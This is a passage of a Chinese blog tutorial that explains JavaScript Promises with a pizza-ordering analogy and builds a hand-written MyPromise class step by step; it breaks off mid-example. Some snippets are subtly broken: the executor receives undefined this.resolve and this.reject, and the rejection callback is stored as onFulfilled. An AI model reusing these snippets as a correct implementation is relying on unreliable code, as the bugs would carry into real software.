class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cancelAnimationFrame(rAF);</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>上述这些方法在许多情况下都很有用，但请注意不要过度使用它们！因为它们仍然在<strong>主线程</strong>上运行，所以<strong>繁重的回调（尤其是那些操纵DOM的回调）</strong>会在不注意的情况下降低页面的速度。</p><h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><p>本质上，Promise 是一个对象，代表操作的中间状态 —— 正如它的单词含义 ‘承诺’ ，它保证在未来可能返回某种结果。虽然 Promise 并不保证操作在何时完成并返回结果，但是它保证当结果可用时，你的代码能正确处理结果，当结果不可用时，你的代码同样会被执行，来优雅的处理错误。</p><p>通常你不会对一个异步操作从开始执行到返回结果所用的时间感兴趣（除非它耗时过长），你会更想在任何时候都能响应操作结果，当然它不会阻塞其余代码的执行就更好了。</p><p><strong>如果某个业务，依赖于上层业务的数据，上层业务又依赖于更上一层的数据，我们还采用回调的方式来处理异步的话，就会出现回调地狱</strong>。</p><p>在传统的异步编程中，如果异步之间存在依赖关系，我们就需要通过层层嵌套回调来满足这种依赖，如果嵌套层数过多，可读性和可维护性都变得很差，产生所谓“<strong>回调地狱</strong>”，而<strong>Promise将回调嵌套改为链式调用，增加可读性和可维护性</strong>。</p><h2 id="回调函数的麻烦"><a href="#回调函数的麻烦" class="headerlink" title="回调函数的麻烦"></a>回调函数的麻烦</h2><p>要完全理解为什么 promise 是一件好事，应该回想之前的回调函数，理解它们造成的困难。</p><p>我们来谈谈订购披萨作为类比。为了使你的订单成功，你必须按顺序执行，<strong>不按顺序执行或上一步没完成就执行下一步是不会成功的</strong>：</p><ol><li>选择配料。如果你是优柔寡断，这可能需要一段时间，如果你无法下定决心或者决定换咖喱，可能会失败。</li><li>下订单。返回比萨饼可能需要一段时间，如果餐厅没有烹饪所需的配料，可能会失败。</li><li>然后你收集你的披萨吃。如果你忘记了自己的钱包，那么这可能会失败，所以无法支付比萨饼的费用！</li></ol><p>对于旧式callbacks，上述功能的伪代码表示可能如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chooseToppings(<span class="function"><span class="keyword">function</span>(<span class="params">toppings</span>) </span>&#123;</span><br><span class="line">  placeOrder(toppings, <span class="function"><span class="keyword">function</span>(<span class="params">order</span>) </span>&#123;</span><br><span class="line">    collectOrder(order, <span class="function"><span class="keyword">function</span>(<span class="params">pizza</span>) </span>&#123;</span><br><span class="line">      eatPizza(pizza);</span><br><span class="line">    &#125;, failureCallback);</span><br><span class="line">  &#125;, failureCallback);</span><br><span class="line">&#125;, failureCallback);</span><br></pre></td></tr></table></figure><p>这很麻烦且难以阅读（通常称为“回调地狱”），需要多次调用<code>failureCallback()</code>（每个嵌套函数一次），还有其他问题。</p><h3 id="使用promise改良"><a href="#使用promise改良" class="headerlink" title="使用promise改良"></a>使用promise改良</h3><p>Promises使得上面的情况更容易编写，解析和运行。如果我们使用异步promises代表上面的伪代码，我们最终会得到这样的结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chooseToppings()</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params">toppings</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> placeOrder(toppings);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params">order</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> collectOrder(order);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params">pizza</span>) </span>&#123;</span><br><span class="line">  eatPizza(pizza);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(failureCallback);</span><br></pre></td></tr></table></figure><p>这要好得多 - 更容易看到发生了什么，我们只需要一个<code>.catch()</code>块来处理所有错误，它不会阻塞主线程（所以我们可以在等待时继续玩视频游戏为了准备好收集披萨），并保证每个操作在运行之前等待先前的操作完成。我们能够以这种方式一个接一个地链接多个异步操作，因为每个<code>.then()</code>块返回一个新的promise，当<code>.then()</code>块运行完毕时它会解析。聪明，对吗？</p><p>使用箭头函数，你可以进一步简化代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chooseToppings()</span><br><span class="line">.then(<span class="function"><span class="params">toppings</span> =&gt;</span></span><br><span class="line">  placeOrder(toppings)</span><br><span class="line">)</span><br><span class="line">.then(<span class="function"><span class="params">order</span> =&gt;</span></span><br><span class="line">  collectOrder(order)</span><br><span class="line">)</span><br><span class="line">.then(<span class="function"><span class="params">pizza</span> =&gt;</span></span><br><span class="line">  eatPizza(pizza)</span><br><span class="line">)</span><br><span class="line">.catch(failureCallback);</span><br></pre></td></tr></table></figure><p>甚至这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chooseToppings()</span><br><span class="line">.then(<span class="function"><span class="params">toppings</span> =&gt;</span> placeOrder(toppings))</span><br><span class="line">.then(<span class="function"><span class="params">order</span> =&gt;</span> collectOrder(order))</span><br><span class="line">.then(<span class="function"><span class="params">pizza</span> =&gt;</span> eatPizza(pizza))</span><br><span class="line">.catch(failureCallback);</span><br></pre></td></tr></table></figure><p>这是有效的，因为使用箭头函数 <code>() =&gt; x</code> 是 <code>()=&gt; &#123;return x;&#125;</code> 的有效简写; 。</p><p>你甚至可以这样做，<strong>因为函数只是直接传递它们的参数，所以不需要额外的函数层：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chooseToppings().then(placeOrder).then(collectOrder).then(eatPizza).catch(failureCallback);</span><br></pre></td></tr></table></figure><p>但是，<strong>这并不容易阅读，如果你的块比我们在此处显示的更复杂，则此语法可能无法使用。</strong></p><p><strong>注意</strong>: 你可以使用 <code>async/await</code> 语法进行进一步的改进。</p><p>最基本的，promise与事件监听器类似，但有一些差异：</p><ul><li>一个promise<strong>只能成功或失败一次</strong>。它不能成功或失败两次，并且一旦操作完成，它就无法从成功切换到失败，反之亦然。</li><li>如果promise成功或失败并且你稍后添加成功/失败回调，则将调用正确的回调，即使事件发生在较早的时间。</li></ul><h2 id="promise的基本流程"><a href="#promise的基本流程" class="headerlink" title="promise的基本流程"></a>promise的基本流程</h2><p>创建promise时，它既不是成功也不是失败状态。这个状态叫作<strong>pending</strong>（待定）。</p><p>当promise返回时，称为 <strong>resolved</strong>（已解决）。</p><ul><li>一个成功<strong>resolved</strong>的promise称为<strong>fullfilled</strong>（<strong>实现</strong>）。它返回一个值，可以通过将<code>.then()</code>块链接到promise链的末尾来访问该值。<code> .then()</code>块中的执行程序函数将包含promise的返回值。</li><li>一个不成功<strong>resolved</strong>的promise被称为<strong>rejected</strong>（<strong>拒绝</strong>）了。它返回一个原因（<strong>reason</strong>），一条错误消息，说明为什么拒绝promise。可以通过将<code>.catch()</code>块链接到promise链的末尾来访问此原因。</li></ul><p>如果一个 promise 已经被兑现（fulfilled）或被拒绝（rejected），那么我们也可以说它处于<em>已敲定（settled）</em>状态。您还会听到一个经常跟 promise 一起使用的术语：<em>已决议（resolved）</em>，它表示 promise 已经处于已敲定(settled)状态，或者为了匹配另一个 promise 的状态被”锁定”了。</p><p><a href="https://imgtu.com/i/btof54"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btof54.png" alt="btof54.png"></a></p><h2 id="Promise-A-规范"><a href="#Promise-A-规范" class="headerlink" title="Promise A+规范"></a>Promise A+规范</h2><p>其实 Promise 有多种规范，除了 Promise A、promise A+ 还有 Promise/B，Promise/D。<strong>目前我们使用的 Promise 是基于 Promise A+ 规范实现的</strong>。</p><h2 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h2><p>很多手写版本都是使用<code>setTimeout</code>去做异步处理，但是 <code>setTimeout</code> 属于<strong>宏任务</strong>，这与Promise 是个<strong>微任务</strong>相矛盾，所以选择一种创建微任务的方式去实现我们的手写代码。</p><p>这里有几种选择，一种就是 Promise A+ 规范中也提到的，<code>process.nextTick</code>（ Node 端 ）与<code>MutationObserver</code>（ 浏览器端 ），考虑到利用这两种方式需要做环境判断，所以在这里我们就推荐另外一种创建微任务的方式 <code>queueMicrotask</code>。</p><h2 id="手写实现"><a href="#手写实现" class="headerlink" title="手写实现"></a>手写实现</h2><h3 id="核心逻辑"><a href="#核心逻辑" class="headerlink" title="核心逻辑"></a>核心逻辑</h3><h4 id="原生Promise"><a href="#原生Promise" class="headerlink" title="原生Promise"></a>原生Promise</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">   resolve(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">   reject(<span class="string">&#x27;err&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;reject&#x27;</span>, reason)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 resolve success</span></span><br></pre></td></tr></table></figure><p>Promise 是一个<strong>类</strong>，在执行这个类的时候会传入一个<strong>执行器</strong>，这个执行器会<strong>立即执行</strong></p><p>Promise 会有三种状态</p><ul><li><strong>Pending 等待</strong></li><li><strong>Fulfilled 完成</strong></li><li><strong>Rejected 失败</strong></li></ul><p>状态只能由 <code>Pending --&gt; Fulfilled</code> 或者 <code>Pending --&gt; Rejected</code>，且<strong>一旦发生改变不可二次修改</strong>；</p><p>Promise 中使用 <code>resolve</code> 和 <code>reject</code> 两个函数来更改状态；</p><p><code>then</code> 方法内部做的事情就是<strong>状态判断</strong></p><ul><li>如果状态是成功，调用<strong>成功回调函数</strong></li><li>如果状态是失败，调用<strong>失败回调函数</strong></li></ul><h4 id="新建MyPromise类，传入执行器executor"><a href="#新建MyPromise类，传入执行器executor" class="headerlink" title="新建MyPromise类，传入执行器executor"></a>新建MyPromise类，传入执行器executor</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新建 MyPromise.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建 MyPromise 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// executor 是一个执行器，进入会立即执行</span></span><br><span class="line">        executor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="executor-传入-resolve-和-reject-方法"><a href="#executor-传入-resolve-和-reject-方法" class="headerlink" title="executor 传入 resolve 和 reject 方法"></a>executor 传入 resolve 和 reject 方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新建 MyPromise.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建 MyPromise 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// resolve和reject为什么要用箭头函数？</span></span><br><span class="line">        <span class="comment">// 如果直接调用的话，普通函数resolve和reject内部this指向的是undefined</span></span><br><span class="line">        <span class="comment">// 用箭头函数就可以让this指向当前实例对象</span></span><br><span class="line">        <span class="comment">// 更改成功后的状态</span></span><br><span class="line">        <span class="keyword">const</span> resolve = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更改失败后的状态</span></span><br><span class="line">        <span class="keyword">const</span> reject = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// executor 是一个执行器，进入会立即执行</span></span><br><span class="line">        <span class="comment">// 并传入resolve和reject方法</span></span><br><span class="line">        executor(<span class="built_in">this</span>.resolve,<span class="built_in">this</span>.reject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="状态与结果的管理"><a href="#状态与结果的管理" class="headerlink" title="状态与结果的管理"></a>状态与结果的管理</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新建 MyPromise.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义三个常量表示状态</span></span><br><span class="line"><span class="keyword">const</span> PENDING=<span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> FULFILLED=<span class="string">&#x27;fulfilled&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> REJECTED=<span class="string">&#x27;rejected&#x27;</span>;</span><br><span class="line"><span class="comment">// 新建 MyPromise 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span></span>&#123;</span><br><span class="line">    <span class="comment">// 公共字段存储状态和结果变量</span></span><br><span class="line">    <span class="comment">// 储存状态的变量，初始值是pending</span></span><br><span class="line">    status=PENDING;</span><br><span class="line">    <span class="comment">// 成功之后的值</span></span><br><span class="line">    value=<span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 失败之后的原因</span></span><br><span class="line">    reason=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// resolve和reject为什么要用箭头函数？</span></span><br><span class="line">        <span class="comment">// 如果直接调用的话，普通函数resolve和reject内部this指向的是undefined</span></span><br><span class="line">        <span class="comment">// 用箭头函数就可以让this指向当前实例对象</span></span><br><span class="line">        <span class="comment">// 更改成功后的状态</span></span><br><span class="line">        <span class="keyword">const</span> resolve = <span class="function">(<span class="params">value</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">this</span>.status===PENDING)&#123;</span><br><span class="line">                <span class="built_in">this</span>.status=FULFILLED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">                <span class="built_in">this</span>.value=value;<span class="comment">// 保存成功之后的值</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更改失败后的状态</span></span><br><span class="line">        <span class="keyword">const</span> reject = <span class="function">(<span class="params">reason</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">this</span>.status===PENDING)&#123;</span><br><span class="line">                <span class="built_in">this</span>.status=REJECTED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">                <span class="built_in">this</span>.reason=reason;<span class="comment">// 保存失败后的原因</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// executor 是一个执行器，进入会立即执行</span></span><br><span class="line">        <span class="comment">// 并传入resolve和reject方法</span></span><br><span class="line">        executor(<span class="built_in">this</span>.resolve,<span class="built_in">this</span>.reject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="then-的简单实现"><a href="#then-的简单实现" class="headerlink" title="then 的简单实现"></a>then 的简单实现</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled,onRejected</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 判断状态</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">this</span>.status===FULFILLED)&#123;</span><br><span class="line">        <span class="comment">// 调用成功回调，并且把值返回</span></span><br><span class="line">        onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">this</span>.status===REJECTED)&#123;</span><br><span class="line">        <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">        onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用export-对外暴露-MyPromise-类"><a href="#使用export-对外暴露-MyPromise-类" class="headerlink" title="使用export 对外暴露 MyPromise 类"></a>使用export 对外暴露 MyPromise 类</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MyPromise.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span></span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> MyPromise <span class="keyword">from</span> <span class="string">&quot;./MyPromise.js&quot;</span></span><br><span class="line"><span class="comment">// index.html</span></span><br><span class="line">&lt;script type=<span class="string">&quot;module&quot;</span> src=<span class="string">&quot;./src/index.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="promise类中加入异步逻辑"><a href="#promise类中加入异步逻辑" class="headerlink" title="promise类中加入异步逻辑"></a>promise类中加入异步逻辑</h3><p>上面还没有经过异步处理，如果有异步逻辑加如来会带来一些问题，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MyPromise <span class="keyword">from</span> <span class="string">&quot;./MyPromise.js&quot;</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">  &#125;, <span class="number">2000</span>); </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;reject&#x27;</span>, reason)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有打印信息！！！</span></span><br></pre></td></tr></table></figure><p><strong>分析原因</strong>：</p><blockquote><p>主线程代码立即执行，setTimeout 是异步代码，then 会马上执行，这个时候判断 Promise 状态，状态是 Pending，然而之前并没有判断等待这个状态</p></blockquote><p>这里就需要我们处理一下 Pending 状态，我们改造一下之前的代码</p><h4 id="缓存成功与失败回调"><a href="#缓存成功与失败回调" class="headerlink" title="缓存成功与失败回调"></a>缓存成功与失败回调</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储成功回调函数</span></span><br><span class="line">onFulfilledCallback = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 存储失败回调函数</span></span><br><span class="line">onRejectedCallback = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><h4 id="then-方法中的-Pending-的处理"><a href="#then-方法中的-Pending-的处理" class="headerlink" title="then 方法中的 Pending 的处理"></a>then 方法中的 Pending 的处理</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled,onRejected</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 判断状态</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">this</span>.status===FULFILLED)&#123;</span><br><span class="line">        <span class="comment">// 调用成功回调，并且把值返回</span></span><br><span class="line">        onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">this</span>.status===REJECTED)&#123;</span><br><span class="line">        <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">        onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">this</span>.status===PENDING)&#123;</span><br><span class="line">        <span class="comment">// 因为不知道后面状态的变化情况，所以将成功回调和失败回调存储起来</span></span><br><span class="line">        <span class="comment">// 等到执行成功失败函数的时候再传递</span></span><br><span class="line">        <span class="built_in">this</span>.onFulfilledCallback=onFulfilled;</span><br><span class="line">        <span class="built_in">this</span>.onRejectedCallback=onFulfilled;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="resolve-与-reject-中调用回调函数"><a href="#resolve-与-reject-中调用回调函数" class="headerlink" title="resolve 与 reject 中调用回调函数"></a>resolve 与 reject 中调用回调函数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更改成功后的状态</span></span><br><span class="line"><span class="keyword">const</span> resolve = <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">        <span class="built_in">this</span>.status = FULFILLED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">        <span class="built_in">this</span>.value = value;<span class="comment">// 保存成功之后的值</span></span><br><span class="line">        <span class="comment">// 判断成功回调是否存在，如果存在就调用</span></span><br><span class="line">        <span class="built_in">this</span>.onFulfilledCallback &amp;&amp; <span class="built_in">this</span>.onFulfilledCallback(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 更改失败后的状态</span></span><br><span class="line"><span class="keyword">const</span> reject = <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">        <span class="built_in">this</span>.status = REJECTED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">        <span class="built_in">this</span>.reason = reason;<span class="comment">// 保存失败后的原因</span></span><br><span class="line">        <span class="comment">// 判断失败回调是否存在，如果存在就调用</span></span><br><span class="line">        <span class="built_in">this</span>.onRejectedCallback &amp;&amp; <span class="built_in">this</span>.onRejectedCallback(reason);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前已经可以简单处理异步问题了</p><h3 id="实现-then-方法多次调用添加多个处理函数"><a href="#实现-then-方法多次调用添加多个处理函数" class="headerlink" title="实现 then 方法多次调用添加多个处理函数"></a>实现 then 方法多次调用添加多个处理函数</h3><blockquote><p>Promise 的 then 方法是可以被多次调用的。这里如果有三个 then 的调用，如果是同步回调，那么直接返回当前的值就行；如果是异步回调，那么保存的成功失败的回调，需要用不同的值保存，因为都互不相同。之前的代码需要改进。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> MyPromise <span class="keyword">from</span> <span class="string">&quot;./MyPromise.js&quot;</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">  &#125;, <span class="number">2000</span>); </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span 